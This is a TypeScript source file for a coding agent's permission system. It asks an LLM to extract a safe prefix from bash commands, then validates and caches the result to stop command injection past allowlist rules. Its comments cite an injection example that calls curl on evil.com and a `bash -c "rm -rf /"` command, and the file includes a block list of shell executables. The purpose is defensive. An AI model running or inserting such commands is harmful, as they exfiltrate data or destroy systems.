import { staticText } from '../../prompts/static-text.js';
/**
 * Bash Command Prefix Extractor — FEATURE_153 (v0.7.38).
 *
 * Asks the LLM (default: main session model; overridable via the same
 * model-resolver chain as FEATURE_092) to extract the SAFE PREFIX of a
 * proposed bash command. The result is consumed by the accept-edits-mode
 * permission check ([`permission/permission.ts:isToolCallAllowed`]) when
 * the user has bash allowlist patterns like `Bash(git commit:*)`:
 *
 *   - Pre-FEATURE_153: naive `command.startsWith('git commit')` →
 *     `git commit -m "msg" $(curl evil.com)` matches; injection sneaks past.
 *   - Post-FEATURE_153: LLM extracts safe prefix; on injection input it
 *     returns `command_injection_detected` → no allowlist pattern matches
 *     → user gets a confirmation prompt for the dangerous command.
 *
 * Mirrors Claude Code's [`utils/shell/prefix.ts:createCommandPrefixExtractor`]
 * (1339-line `commands.ts` companion + 367-line shared factory). KodaX
 * differences:
 *
 *   1. Uses `sideQuery` (already wraps every KodaX provider) instead of
 *      a Haiku-specific helper. This means by default the user's main
 *      session model handles prefix extraction (consistent with the rest
 *      of KodaX's "use main model unless explicitly overridden" pattern).
 *      An override path can be added later by mirroring FEATURE_092's
 *      model-resolver — out of scope for v1 of FEATURE_153.
 *   2. No analytics (`logEvent` calls); KodaX is a single-user CLI.
 *   3. No GrowthBook gating; KodaX has no remote feature flags.
 *   4. Same LRU cache (size 200) with rejection-eviction guard, so aborted
 *      / failed extractions don't poison future lookups.
 *
 * Why module-scope cache (vs. per-PermissionContext): mirrors CC. Bash
 * commands recur across REPL turns (`git status`, `npm test`, etc.); a
 * session-scoped cache amortises LLM cost across the whole user session.
 * `clearBashPrefixCache(extractor)` exists for `/clear`.
 */

import type { CostTracker } from '@kodax-ai/llm';
import { KodaXBaseProvider, sideQuery } from '@kodax-ai/llm';

const DEFAULT_TIMEOUT_MS = 8000;
const QUERY_SOURCE = 'bash_prefix_extractor';
const DEFAULT_CACHE_SIZE = 200;

/**
 * Shell executables that must NEVER be accepted as bare prefixes.
 *
 * Allowing e.g. `Bash(bash:*)` to match against extracted prefix `bash`
 * would let any command through (`bash -c "rm -rf /"` matches `bash` prefix),
 * defeating the whole permission system. Mirrors CC `prefix.ts:28-44`.
 */
const DANGEROUS_SHELL_PREFIXES = new Set([
  'sh',
  'bash',
  'zsh',
  'fish',
  'csh',
  'tcsh',
  'ksh',
  'dash',
  'cmd',
  'cmd.exe',
  'powershell',
  'powershell.exe',
  'pwsh',
  'pwsh.exe',
  'bash.exe',
]);

/**
 * The system prompt sent to the LLM. Ported verbatim from Claude Code
 * [`commands.ts:438-499 BASH_POLICY_SPEC`] — preserves CC's verified
 * prompt engineering (tested at scale across CC's user base).
 *
 * Critical contract: the LLM must return ONE of:
 *   - The literal string `command_injection_detected`
 *   - The literal string `none`
 *   - A safe prefix string that is a literal prefix of the input command
 *
 * Anything else (chatty preamble, code fences, multiple lines) is treated
 * as `none` by the post-parse validation.
 */
export const BASH_POLICY_SPEC = staticText("t11.guardrails/auto-mode/bash-prefix-extractor.0");

/**
 * Outcome of a single prefix-extraction call.
 *
 *   `prefix`              — LLM returned a safe prefix; pattern matching
 *                           should compare against `value` exactly (NOT
 *                           command.startsWith(...) — the prefix is the
 *                           extracted, normalised form).
 *   `injection_detected`  — LLM flagged the command as containing injection.
 *                           No allowlist pattern should match; user must
 *                           confirm manually.
 *   `no_prefix`           — LLM returned `none` / `git` (too broad) / a
 *                           dangerous shell name / unparseable response /
 *                           a string that wasn't actually a prefix of the
 *                           input. Treat as `injection_detected` from a
 *                           safety standpoint (no auto-allow).
 */
export type BashPrefixResult =
  | { readonly kind: 'prefix'; readonly value: string }
  | { readonly kind: 'injection_detected'; readonly reason: string }
  | { readonly kind: 'no_prefix'; readonly reason: string };

export interface ExtractCommandPrefixOptions {
  readonly provider: KodaXBaseProvider;
  readonly model: string;
  readonly command: string;
  readonly timeoutMs?: number;
  readonly abortSignal?: AbortSignal;
  readonly costTracker?: CostTracker;
  /**
   * Mirrors `classify.ts:setCostTracker` — `sideQuery` returns a fresh
   * tracker copy on success; without this setter the recorded usage is
   * dropped. Wire from the call site so the agent's tracker accumulates
   * `bash_prefix_extractor` cost under its own role.
   */
  readonly setCostTracker?: (next: CostTracker) => void;
}

/**
 * Single uncached extraction. Use `createBashPrefixExtractor` for the
 * cached, session-scoped surface that callers actually consume.
 *
 * Returns `no_prefix` (NOT throws) on every recoverable failure mode
 * (timeout, parse failure, dangerous prefix); `injection_detected` only
 * when the LLM explicitly says so. AbortError is re-thrown so the caller's
 * cancellation chain stays intact (mirrors `classify.ts` behavior).
 */
export async function extractCommandPrefix(
  opts: ExtractCommandPrefixOptions,
): Promise<BashPrefixResult> {
  const trimmed = opts.command.trim();
  if (!trimmed) {
    return { kind: 'no_prefix', reason: 'empty command' };
  }

  const result = await sideQuery({
    provider: opts.provider,
    model: opts.model,
    system: BASH_POLICY_SPEC,
    messages: [{ role: 'user', content: `Command: ${trimmed}` }],
    timeoutMs: opts.timeoutMs ?? DEFAULT_TIMEOUT_MS,
    abortSignal: opts.abortSignal,
    querySource: QUERY_SOURCE,
    credentialPurpose: 'classifier',
    costTracker: opts.costTracker,
  });

  if (
    opts.setCostTracker &&
    result.costTracker !== undefined &&
    result.costTracker !== opts.costTracker
  ) {
    opts.setCostTracker(result.costTracker);
  }

  switch (result.stopReason) {
    case 'end_turn':
    case 'max_tokens': {
      // Stable results (prefix / injection / no_prefix from a successful LLM
      // call) are returned directly so the LRU cache can store them. Same
      // input → same answer until cache eviction or `clearCache()`.
      return validatePrefixResponse(trimmed, result.text);
    }
    case 'timeout':
      // Throw on transient failures so the cache's `.catch` eviction guard
      // fires (mirrors CC `prefix.ts:114-118`). Caller decides whether to
      // retry or surface to user.
      throw new Error(
        `extractCommandPrefix timeout (${opts.timeoutMs ?? DEFAULT_TIMEOUT_MS}ms)`,
      );
    case 'aborted':
      throw new DOMException('extractCommandPrefix aborted', 'AbortError');
    case 'error':
    default:
      throw (
        result.error ??
        new Error(`extractCommandPrefix failed (stopReason=${result.stopReason})`)
      );
  }
}

/**
 * Parse + validate the LLM's response. Centralises the post-parse safety
 * gates so cache hits and live calls share the same guard set.
 *
 *   1. Trim to the first non-empty line (LLM occasionally adds preamble
 *      despite the prompt's instruction).
 *   2. `command_injection_detected` → injection_detected.
 *   3. `none` (case-sensitive per CC) → no_prefix.
 *   4. Bare `git` → no_prefix (too broad; mirrors CC's `prefix.ts:276`).
 *   5. Lowercased prefix in `DANGEROUS_SHELL_PREFIXES` → no_prefix.
 *   6. Prefix that isn't actually a prefix of the input command → no_prefix
 *      (LLM hallucination guard).
 *   7. Otherwise → prefix.
 */
function validatePrefixResponse(command: string, raw: string): BashPrefixResult {
  const firstLine = raw.trim().split(/\r?\n/)[0]?.trim() ?? '';
  if (!firstLine) {
    return { kind: 'no_prefix', reason: 'empty response' };
  }
  if (firstLine === 'command_injection_detected') {
    return { kind: 'injection_detected', reason: 'LLM flagged command injection' };
  }
  if (firstLine === 'none') {
    return { kind: 'no_prefix', reason: 'LLM declared no prefix' };
  }
  if (firstLine === 'git') {
    return {
      kind: 'no_prefix',
      reason: 'bare `git` is too broad to allow; require subcommand',
    };
  }
  if (DANGEROUS_SHELL_PREFIXES.has(firstLine.toLowerCase())) {
    return {
      kind: 'no_prefix',
      reason: `dangerous shell executable as prefix: ${firstLine}`,
    };
  }
  if (!command.startsWith(firstLine)) {
    return {
      kind: 'no_prefix',
      reason: 'LLM returned a string that is not a prefix of the command',
    };
  }
  return { kind: 'prefix', value: firstLine };
}

/**
 * Cached, session-scoped extractor surface. Returned by
 * `createBashPrefixExtractor`; consumed by `isToolCallAllowed`.
 */
export interface BashPrefixExtractor {
  /**
   * Extract (or hit cache for) the safe prefix of a bash command.
   * Concurrent calls for the same command share one in-flight promise
   * (cache stores the promise, not the resolved value, mirroring CC).
   */
  extract(command: string, signal?: AbortSignal): Promise<BashPrefixResult>;
  /** Drop all cached results. Wire to `/clear` slash command. */
  clearCache(): void;
  /** Cache size accessor for diagnostics / tests. */
  cacheSize(): number;
}

export interface CreateBashPrefixExtractorOptions {
  /**
   * LIVE getter for the provider instance. Re-evaluated on every extract()
   * call so mid-session `/provider` swaps redirect the extractor without
   * requiring any explicit reset. Mirrors `auto-mode/guardrail.ts`'s
   * provider-name + resolveProvider live-resolution pattern but expressed
   * directly as a provider getter for module-level simplicity.
   */
  readonly getProvider: () => KodaXBaseProvider;
  /**
   * LIVE getter for the model. Re-evaluated on every extract() call so
   * mid-session `/model` swaps redirect the extractor.
   */
  readonly getModel: () => string;
  readonly timeoutMs?: number;
  readonly cacheSize?: number;
  readonly costTracker?: () => CostTracker | undefined;
  readonly setCostTracker?: (next: CostTracker) => void;
}

/**
 * Build a cached, session-scoped extractor. The cache is bounded LRU
 * (default 200 entries) — when full, the oldest entry is evicted. On
 * extraction failure, the cached promise is removed (post-resolution)
 * so subsequent calls retry instead of re-returning the failure.
 *
 * Identity-guard pattern (mirrors CC `prefix.ts:114-118`): the
 * post-rejection cleanup checks that the cache slot still holds the
 * SAME promise before deleting — protects against the race where LRU
 * eviction has already replaced the slot with a newer promise.
 */
export function createBashPrefixExtractor(
  opts: CreateBashPrefixExtractorOptions,
): BashPrefixExtractor {
  const cacheSize = opts.cacheSize ?? DEFAULT_CACHE_SIZE;
  // Insertion-ordered Map gives us LRU semantics: re-insert on access to
  // bump to "most recent"; evict from the front when over capacity.
  const cache = new Map<string, Promise<BashPrefixResult>>();

  const evictIfOversized = (): void => {
    while (cache.size > cacheSize) {
      const oldestKey = cache.keys().next().value;
      if (oldestKey === undefined) break;
      cache.delete(oldestKey);
    }
  };

  const extract = (
    command: string,
    signal?: AbortSignal,
  ): Promise<BashPrefixResult> => {
    const cached = cache.get(command);
    if (cached !== undefined) {
      // Bump to most-recent: delete + re-insert keeps LRU ordering correct.
      cache.delete(command);
      cache.set(command, cached);
      return cached;
    }

    const promise = extractCommandPrefix({
      provider: opts.getProvider(),
      model: opts.getModel(),
      command,
      timeoutMs: opts.timeoutMs,
      abortSignal: signal,
      costTracker: opts.costTracker?.(),
      setCostTracker: opts.setCostTracker,
    });

    // Cache the promise (so concurrent in-flight requests dedupe). Evict
    // on rejection to keep the failure transient. Identity guard: only
    // delete if the cache slot still holds the SAME promise — LRU may
    // have already replaced it.
    promise.catch(() => {
      if (cache.get(command) === promise) {
        cache.delete(command);
      }
    });

    cache.set(command, promise);
    evictIfOversized();
    return promise;
  };

  return {
    extract,
    clearCache: () => cache.clear(),
    cacheSize: () => cache.size,
  };
}
